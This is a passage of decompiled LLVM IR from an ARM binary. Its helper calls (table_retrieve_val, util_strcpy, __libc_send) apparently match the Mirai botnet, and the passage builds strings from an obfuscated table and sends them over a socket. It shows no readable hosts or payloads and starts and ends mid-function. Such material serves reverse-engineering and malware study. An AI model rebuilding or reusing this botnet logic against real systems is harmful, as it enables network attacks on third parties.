  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8970 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b350.41 to i32), i32* %r1.global-to-local, align 4
  %v2_897c = add i32 %v2_8970, %stack_var_-20860.0.ph
  store i32 %v2_897c, i32* @r0, align 4
  %v3_8980 = inttoptr i32 %v2_897c to i8*
  %v4_8980 = call i32 @util_strcpy(i8* %v3_8980, i32 ptrtoint ([9 x i8]* @global_var_1b350.41 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8988 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_8990 = load i32, i32* @r5, align 4
  %v2_8994 = add i32 %v2_8988, %stack_var_-20860.0.ph
  store i32 %v2_8994, i32* @r0, align 4
  %v1_8998 = add i32 %v0_8990, 789
  store i32 %v1_8998, i32* %r1.global-to-local, align 4
  %v2_899c = inttoptr i32 %v2_8994 to i8*
  %v3_899c = call i32 @util_strcpy(i8* %v2_899c, i32 %v1_8998)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89a4 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_89ac = add i32 %v2_89a4, %stack_var_-20860.0.ph
  store i32 %v2_89ac, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  %v3_89b4 = inttoptr i32 %v2_89ac to i8*
  %v4_89b4 = call i32 @util_strcpy(i8* %v3_89b4, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32))
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_89bc = call i32 @table_unlock_val(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89c4 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_89c8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_89c8, i32* %r1.global-to-local, align 4
  store i32 %v2_89c4, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_89d4 = inttoptr i32 %v0_89c8 to i32*
  %v3_89d4 = call i32 @table_retrieve_val(i32 35, i32* %v2_89d4)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_89d4, i32* %r1.global-to-local, align 4
  %v1_89e0 = load i32, i32* @r4, align 4
  %v2_89e0 = add i32 %v1_89e0, %stack_var_-20860.0.ph
  store i32 %v2_89e0, i32* @r0, align 4
  %v2_89e4 = inttoptr i32 %v2_89e0 to i8*
  %v3_89e4 = call i32 @util_strcpy(i8* %v2_89e4, i32 %v3_89d4)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_89ec = call i32 @table_lock_val(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89f4 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8a00 = add i32 %v2_89f4, %stack_var_-20860.0.ph
  store i32 %v2_8a00, i32* @r0, align 4
  %v3_8a04 = inttoptr i32 %v2_8a00 to i8*
  %v4_8a04 = call i32 @util_strcpy(i8* %v3_8a04, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32))
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8a0c = call i32 @table_unlock_val(i32 36)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a14 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8a18 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a18, i32* %r1.global-to-local, align 4
  store i32 %v2_8a14, i32* @r4, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v2_8a24 = inttoptr i32 %v0_8a18 to i32*
  %v3_8a24 = call i32 @table_retrieve_val(i32 36, i32* %v2_8a24)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8a24, i32* %r1.global-to-local, align 4
  %v1_8a30 = load i32, i32* @r4, align 4
  %v2_8a30 = add i32 %v1_8a30, %stack_var_-20860.0.ph
  store i32 %v2_8a30, i32* @r0, align 4
  %v2_8a34 = inttoptr i32 %v2_8a30 to i8*
  %v3_8a34 = call i32 @util_strcpy(i8* %v2_8a34, i32 %v3_8a24)
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8a3c = call i32 @table_lock_val(i32 36)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a44 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8a50 = add i32 %v2_8a44, %stack_var_-20860.0.ph
  store i32 %v2_8a50, i32* @r0, align 4
  %v3_8a54 = inttoptr i32 %v2_8a50 to i8*
  %v4_8a54 = call i32 @util_strcpy(i8* %v3_8a54, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32))
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_8a5c = call i32 @table_unlock_val(i32 37)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a64 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8a68 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 %v2_8a64, i32* @r4, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v2_8a74 = inttoptr i32 %v0_8a68 to i32*
  %v3_8a74 = call i32 @table_retrieve_val(i32 37, i32* %v2_8a74)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a74, i32* %r1.global-to-local, align 4
  %v1_8a80 = load i32, i32* @r4, align 4
  %v2_8a80 = add i32 %v1_8a80, %stack_var_-20860.0.ph
  store i32 %v2_8a80, i32* @r0, align 4
  %v2_8a84 = inttoptr i32 %v2_8a80 to i8*
  %v3_8a84 = call i32 @util_strcpy(i8* %v2_8a84, i32 %v3_8a74)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_8a8c = call i32 @table_lock_val(i32 37)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a94 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8aa0 = add i32 %v2_8a94, %stack_var_-20860.0.ph
  store i32 %v2_8aa0, i32* @r0, align 4
  %v3_8aa4 = inttoptr i32 %v2_8aa0 to i8*
  %v4_8aa4 = call i32 @util_strcpy(i8* %v3_8aa4, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32))
  store i32 %v4_8aa4, i32* %r0.global-to-local, align 4
  store i32 %v6_81fc, i32* %ip.global-to-local, align 4
  %v1_8aac = load i32, i32* %sb.global-to-local, align 4
  %v3_8aac = icmp uge i32 %v6_81fc, %v1_8aac
  store i1 %v3_8aac, i1* %cpsr_c.global-to-local, align 1
  %v9_8aac = icmp eq i32 %v6_81fc, %v1_8aac
  store i1 %v9_8aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8aac, label %dec_label_pc_8b84, label %dec_label_pc_8ab4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_88bc
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8ab8 = call i32 @table_unlock_val(i32 38)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ac0 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8ac4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8ac4, i32* %r1.global-to-local, align 4
  store i32 %v2_8ac0, i32* @r4, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v2_8ad0 = inttoptr i32 %v0_8ac4 to i32*
  %v3_8ad0 = call i32 @table_retrieve_val(i32 38, i32* %v2_8ad0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_8ad0, i32* %r1.global-to-local, align 4
  %v1_8adc = load i32, i32* @r4, align 4
  %v2_8adc = add i32 %v1_8adc, %stack_var_-20860.0.ph
  store i32 %v2_8adc, i32* @r0, align 4
  %v2_8ae0 = inttoptr i32 %v2_8adc to i8*
  %v3_8ae0 = call i32 @util_strcpy(i8* %v2_8ae0, i32 %v3_8ad0)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8ae8 = call i32 @table_lock_val(i32 38)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8af0 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8af8 = add i32 %v2_8af0, %stack_var_-20860.0.ph
  store i32 %v2_8af8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  %v3_8b00 = inttoptr i32 %v2_8af8 to i8*
  %v4_8b00 = call i32 @util_strcpy(i8* %v3_8b00, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8b0c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8b0c, i32* %r1.global-to-local, align 4
  store i32 %v2_8b08, i32* %r4.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_8b18 = inttoptr i32 %v0_8b0c to i32*
  %v3_8b18 = call i32 @table_retrieve_val(i32 43, i32* %v2_8b18)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8b18, i32* %r1.global-to-local, align 4
  %v2_8b24 = add i32 %v2_8b08, %stack_var_-20860.0.ph
  store i32 %v2_8b24, i32* @r0, align 4
  %v2_8b28 = inttoptr i32 %v2_8b24 to i8*
  %v3_8b28 = call i32 @util_strcpy(i8* %v2_8b28, i32 %v3_8b18)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b30 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b360.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8b3c = add i32 %v2_8b30, %stack_var_-20860.0.ph
  store i32 %v2_8b3c, i32* @r0, align 4
  %v2_8b40 = inttoptr i32 %v2_8b3c to i8*
  %v3_8b40 = call i32 @util_strcpy(i8* %v2_8b40, i32 ptrtoint (i32* @global_var_1b360.37 to i32))
  store i32 %v6_81fc, i32* %r0.global-to-local, align 4
  %v2_8b48 = call i32 @util_strlen(i8* %v1_8b48)
  store i32 %v2_8b48, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b54 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8b60 = add i32 %v2_8b54, %stack_var_-20860.0.ph
  store i32 %v2_8b60, i32* %r2.global-to-local, align 4
  %v0_8b64 = load i32, i32* @r4, align 4
  store i32 %v0_8b64, i32* %r0.global-to-local, align 4
  %v3_8b68 = trunc i32 %v0_8b64 to i8
  %v4_8b68 = call i32 @util_itoa(i8 %v3_8b68, i32 10, i32 %v2_8b60)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b70 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8b7c = add i32 %v2_8b70, %stack_var_-20860.0.ph
  store i32 %v2_8b7c, i32* @r0, align 4
  %v3_8b80 = inttoptr i32 %v2_8b7c to i8*
  %v4_8b80 = call i32 @util_strcpy(i8* %v3_8b80, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32))
  store i32 %v4_8b80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_88bc, %dec_label_pc_8ab4
  %v0_8b84 = load i32, i32* @r6, align 4
  %v1_8b84 = add i32 %v0_8b84, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b88 = icmp eq i32 %v3_8b84, 0
  store i1 %v2_8b88, i1* %cpsr_z.global-to-local, align 1
  %tmp177 = icmp slt i32 %v3_8b84, 1
  br i1 %tmp177, label %dec_label_pc_8c30, label %dec_label_pc_8b90

dec_label_pc_8b90:                                ; preds = %dec_label_pc_8b84
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b94 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8b9c = add i32 %v2_8b94, %stack_var_-20860.0.ph
  store i32 %v2_8b9c, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b370.45 to i32), i32* %r1.global-to-local, align 4
  %v3_8ba4 = inttoptr i32 %v2_8b9c to i8*
  %v4_8ba4 = call i32 @util_strcpy(i8* %v3_8ba4, i32 ptrtoint ([9 x i8]* @global_var_1b370.45 to i32))
  store i32 %v4_8ba4, i32* %r0.global-to-local, align 4
  %v0_8ba8 = load i32, i32* @r6, align 4
  %v1_8ba8 = add i32 %v0_8ba8, 16
  %v2_8ba8 = inttoptr i32 %v1_8ba8 to i32*
  %v3_8ba8 = load i32, i32* %v2_8ba8, align 4
  store i32 %v3_8ba8, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8bb0 = icmp eq i32 %v3_8ba8, 0
  store i1 %v2_8bb0, i1* %cpsr_z.global-to-local, align 1
  %v0_8bb4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8bb4, i32* %stack_var_-44, align 4
  %tmp178 = icmp slt i32 %v3_8ba8, 1
  br i1 %tmp178, label %dec_label_pc_8c18, label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8b90, %dec_label_pc_8bbc
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bc0 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_8bc8 = load i32, i32* %stack_var_-44, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_8bd0 = and i32 %v3_8bc8, 33554432
  %v2_8bd0 = icmp ne i32 %v1_8bd0, 0
  store i1 %v2_8bd0, i1* %cpsr_c.global-to-local, align 1
  %v3_8bd0 = mul i32 %v3_8bc8, 128
  %v1_8bd4 = add i32 %v3_8bd0, 1472
  %v2_8bd8 = add i32 %v2_8bc0, %stack_var_-20860.0.ph
  store i32 %v2_8bd8, i32* @r0, align 4
  %v0_8bdc = load i32, i32* @r5, align 4
  %v2_8bdc = add i32 %v1_8bd4, %v0_8bdc
  store i32 %v2_8bdc, i32* %r1.global-to-local, align 4
  %v2_8be0 = inttoptr i32 %v2_8bd8 to i8*
  %v3_8be0 = call i32 @util_strcpy(i8* %v2_8be0, i32 %v2_8bdc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8be8 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b37c.47 to i32), i32* %r1.global-to-local, align 4
  %v2_8bf4 = add i32 %v2_8be8, %stack_var_-20860.0.ph
  store i32 %v2_8bf4, i32* @r0, align 4
  %v3_8bf8 = inttoptr i32 %v2_8bf4 to i8*
  %v4_8bf8 = call i32 @util_strcpy(i8* %v3_8bf8, i32 ptrtoint ([3 x i8]* @global_var_1b37c.47 to i32))
  store i32 %v4_8bf8, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8c00 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c00, i32* %r3.global-to-local, align 4
  %v0_8c04 = load i32, i32* @r6, align 4
  %v1_8c04 = add i32 %v0_8c04, 16
  %v2_8c04 = inttoptr i32 %v1_8c04 to i32*
  %v3_8c04 = load i32, i32* %v2_8c04, align 4
  store i32 %v3_8c04, i32* %r2.global-to-local, align 4
  %v1_8c08 = add i32 %v3_8c00, 1
  store i32 %v1_8c08, i32* %ip.global-to-local, align 4
  %v3_8c0c = icmp uge i32 %v3_8c04, %v1_8c08
  store i1 %v3_8c0c, i1* %cpsr_c.global-to-local, align 1
  %v9_8c0c = icmp eq i32 %v3_8c04, %v1_8c08
  store i1 %v9_8c0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8c08, i32* %stack_var_-44, align 4
  %v8_8c14 = icmp sgt i32 %v3_8c04, %v1_8c08
  br i1 %v8_8c14, label %dec_label_pc_8bbc, label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8bbc, %dec_label_pc_8b90
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c1c = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8c28 = add i32 %v2_8c1c, %stack_var_-20860.0.ph
  store i32 %v2_8c28, i32* @r0, align 4
  %v3_8c2c = inttoptr i32 %v2_8c28 to i8*
  %v4_8c2c = call i32 @util_strcpy(i8* %v3_8c2c, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32))
  store i32 %v4_8c2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c30

dec_label_pc_8c30:                                ; preds = %dec_label_pc_8b84, %dec_label_pc_8c18
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c34 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r1.global-to-local, align 4
  %v2_8c40 = add i32 %v2_8c34, %stack_var_-20860.0.ph
  store i32 %v2_8c40, i32* @r0, align 4
  %v3_8c44 = inttoptr i32 %v2_8c40 to i8*
  %v4_8c44 = call i32 @util_strcpy(i8* %v3_8c44, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32))
  store i32 %v4_8c44, i32* %r0.global-to-local, align 4
  store i32 %v6_81fc, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_8c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c4c, label %dec_label_pc_8c6c, label %dec_label_pc_8c54

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c30
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c58 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_81fc, i32* %r1.global-to-local, align 4
  %v2_8c64 = add i32 %v2_8c58, %stack_var_-20860.0.ph
  store i32 %v2_8c64, i32* @r0, align 4
  %v2_8c68 = inttoptr i32 %v2_8c64 to i8*
  %v3_8c68 = call i32 @util_strcpy(i8* %v2_8c68, i32 %v6_81fc)
  store i32 %v3_8c68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c6c

dec_label_pc_8c6c:                                ; preds = %dec_label_pc_8c30, %dec_label_pc_8c54
  %v0_8c6c = load i32, i32* @r5, align 4
  %v1_8c6c = add i32 %v0_8c6c, 1440
  store i32 %v1_8c6c, i32* %r4.global-to-local, align 4
  %v0_8c70 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8c70, i32* %r0.global-to-local, align 4
  store i32 %v1_8c6c, i32* %r1.global-to-local, align 4
  %v2_8c78 = inttoptr i32 %v0_8c70 to i8*
  %v3_8c78 = call i32 @util_strcmp(i8* %v2_8c78, i32 %v1_8c6c)
  store i32 %v3_8c78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8c7c = icmp eq i32 %v3_8c78, 0
  store i1 %v2_8c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c7c, label %dec_label_pc_96bc, label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c6c, %dec_label_pc_96bc
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8c88 = load i32, i32* @r6, align 4
  %v1_8c88 = add i32 %v0_8c88, -1452
  %v2_8c88 = inttoptr i32 %v1_8c88 to i32*
  %v3_8c88 = load i32, i32* %v2_8c88, align 4
  store i32 %v3_8c88, i32* @r4, align 4
  %v2_8c8c = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8c8c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8c9c = load i32, i32* @r4, align 4
  store i32 %v0_8c9c, i32* %r0.global-to-local, align 4
  %v4_8ca0 = call i32 @__libc_send(i32 %v0_8c9c, i32 %stack_var_-20860.0.ph, i32 %v2_8c8c, i32 16384)
  store i32 %v4_8ca0, i32* %r0.global-to-local, align 4
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v1_8ca4 = add i32 %v0_8ca4, -1452
  %v2_8ca4 = inttoptr i32 %v1_8ca4 to i32*
  %v3_8ca4 = load i32, i32* %v2_8ca4, align 4
  store i32 %v3_8ca4, i32* %ip.global-to-local, align 4
  %v3_8cac = udiv i32 %v3_8ca4, 32
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v3_8cb4 = mul nuw nsw i32 %v3_8cac, 4
  %v2_8cb8 = add i32 %v3_8cb4, %v2_8710
  store i32 %v2_8cb8, i32* %r2.global-to-local, align 4
  %v1_8cbc = add i32 %v2_8cb8, -164
  %v2_8cbc = inttoptr i32 %v1_8cbc to i32*
  %v3_8cbc = load i32, i32* %v2_8cbc, align 4
  %v1_8cc4 = urem i32 %v3_8ca4, 32
  store i32 %v1_8cc4, i32* %r0.global-to-local, align 4
  %v7_8cc8 = shl i32 1, %v1_8cc4
  %v8_8cc8 = or i32 %v3_8cbc, %v7_8cc8
  store i32 %v8_8cc8, i32* @r1, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_8cc8, i32* %v2_8cbc, align 4
  %v0_8cd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cd4 = trunc i32 %v0_8cd4 to i8
  %v2_8cd4 = load i32, i32* @r6, align 4
  %v3_8cd4 = add i32 %v2_8cd4, -1448
  %v4_8cd4 = inttoptr i32 %v3_8cd4 to i8*
  store i8 %v1_8cd4, i8* %v4_8cd4, align 1
  %v0_8cd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cd8 = load i32, i32* @r8, align 4
  %v2_8cd8 = sub i32 %v0_8cd8, %v1_8cd8
  %v3_8cd8 = icmp uge i32 %v0_8cd8, %v1_8cd8
  store i1 %v3_8cd8, i1* %cpsr_c.global-to-local, align 1
  %v4_8cd8 = xor i32 %v1_8cd8, %v0_8cd8
  %v5_8cd8 = xor i32 %v2_8cd8, %v0_8cd8
  %v6_8cd8 = and i32 %v5_8cd8, %v4_8cd8
  %v7_8cd8 = icmp slt i32 %v6_8cd8, 0
  %v8_8cd8 = icmp slt i32 %v2_8cd8, 0
  %v9_8cd8 = icmp eq i32 %v0_8cd8, %v1_8cd8
  store i1 %v9_8cd8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8530, i32* %r2.global-to-local, align 4
  %v3_8ce0 = xor i1 %v8_8cd8, %v7_8cd8
  %v4_8ce0 = or i1 %v9_8cd8, %v3_8ce0
  br i1 %v4_8ce0, label %bb180, label %bb179

bb179:                                            ; preds = %dec_label_pc_8c84
  %v6_8ce0 = add i32 %v0_8cd8, 1
  store i32 %v6_8ce0, i32* @r8, align 4
  br label %bb180

bb180:                                            ; preds = %dec_label_pc_8c84, %bb179
  %v1_8ce4 = load i32, i32* @r6, align 4
  %v2_8ce4 = add i32 %v1_8ce4, -1440
  %v3_8ce4 = inttoptr i32 %v2_8ce4 to i32*
  store i32 %v2_8530, i32* %v3_8ce4, align 4
  br label %dec_label_pc_85f4

dec_label_pc_8cec:                                ; preds = %dec_label_pc_85ac
  %v1_8cec = add i32 %v3_88b0, -1444
  %v2_8cec = inttoptr i32 %v1_8cec to i32*
  %v3_8cec = load i32, i32* %v2_8cec, align 4
  store i32 %v2_8530, i32* @r1, align 4
  %v2_8cf4 = sub i32 %v2_8530, %v3_8cec
  store i32 %v2_8cf4, i32* %r3.global-to-local, align 4
  %v2_8cf8 = icmp ugt i32 %v2_8cf4, 29
  store i1 %v2_8cf8, i1* %cpsr_c.global-to-local, align 1
  %v7_8cf8 = icmp eq i32 %v2_8cf4, 30
  store i1 %v7_8cf8, i1* %cpsr_z.global-to-local, align 1
  %v2_8cfc = xor i1 %v7_8cf8, true
  %v3_8cfc = and i1 %v2_8cf8, %v2_8cfc
  br i1 %v3_8cfc, label %dec_label_pc_85dc, label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8cec
  %v2_8d00 = inttoptr i32 %v1_8618 to i32*
  %v3_8d00 = load i32, i32* %v2_8d00, align 4
  store i32 %v3_8d00, i32* %ip.global-to-local, align 4
  %v3_8d08 = udiv i32 %v3_8d00, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d0c = mul nuw nsw i32 %v3_8d08, 4
  store i32 %v3_8d0c, i32* %r2.global-to-local, align 4
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8718

dec_label_pc_8d1c:                                ; preds = %dec_label_pc_85bc
  %v2_8d1c = inttoptr i32 %v1_8618 to i32*
  %v3_8d1c = load i32, i32* %v2_8d1c, align 4
  store i32 %v3_8d1c, i32* %ip.global-to-local, align 4
  %v3_8d24 = udiv i32 %v3_8d1c, 32
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  %v3_8d2c = mul nuw nsw i32 %v3_8d24, 4
  %v2_8d30 = add i32 %v3_8d2c, %v2_8710
  store i32 %v2_8d30, i32* %r2.global-to-local, align 4
  %v1_8d34 = add i32 %v2_8d30, -164
  %v2_8d34 = inttoptr i32 %v1_8d34 to i32*
  %v3_8d34 = load i32, i32* %v2_8d34, align 4
  %v1_8d38 = urem i32 %v3_8d1c, 32
  store i32 %v1_8d38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8d40 = shl i32 1, %v1_8d38
  %v8_8d40 = or i32 %v3_8d34, %v7_8d40
  store i32 %v8_8d40, i32* @r1, align 4
  %v1_8d44 = load i32, i32* @r8, align 4
  %v2_8d44 = sub i32 %v3_8d1c, %v1_8d44
  %v3_8d44 = icmp uge i32 %v3_8d1c, %v1_8d44
  store i1 %v3_8d44, i1* %cpsr_c.global-to-local, align 1
  %v4_8d44 = xor i32 %v1_8d44, %v3_8d1c
  %v5_8d44 = xor i32 %v2_8d44, %v3_8d1c
  %v6_8d44 = and i32 %v5_8d44, %v4_8d44
  %v7_8d44 = icmp slt i32 %v6_8d44, 0
  %v8_8d44 = icmp slt i32 %v2_8d44, 0
  %v9_8d44 = icmp eq i32 %v3_8d1c, %v1_8d44
  store i1 %v9_8d44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d40, i32* %v2_8d34, align 4
  %v3_8d4c = xor i1 %v8_8d44, %v7_8d44
  %v4_8d4c = or i1 %v9_8d44, %v3_8d4c
  br i1 %v4_8d4c, label %dec_label_pc_85f4, label %dec_label_pc_8d50

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d1c
  %v0_8d50 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d50 = load i32, i32* %r3.global-to-local, align 4
  %v2_8d50 = add i32 %v1_8d50, %v0_8d50
  store i32 %v2_8d50, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8d58:                                ; preds = %dec_label_pc_87dc
  %v0_8d58 = call i32 @__GI___errno_location()
  store i32 %v0_8d58, i32* %r0.global-to-local, align 4
  %v0_8d5c = load i32, i32* @sl, align 4
  %v1_8d5c = add i32 %v0_8d5c, 660
  %v2_8d5c = inttoptr i32 %v1_8d5c to i32*
  %v3_8d5c = load i32, i32* %v2_8d5c, align 4
  store i32 %v3_8d5c, i32* @r3, align 4
  %v0_8d60 = load i32, i32* %sb.global-to-local, align 4
  %v2_8d64 = icmp ugt i32 %v3_8d5c, 1023
  store i1 %v2_8d64, i1* %cpsr_c.global-to-local, align 1
  %v7_8d64 = icmp eq i32 %v3_8d5c, 1024
  store i1 %v7_8d64, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_8d58, i32* %fp.global-to-local, align 4
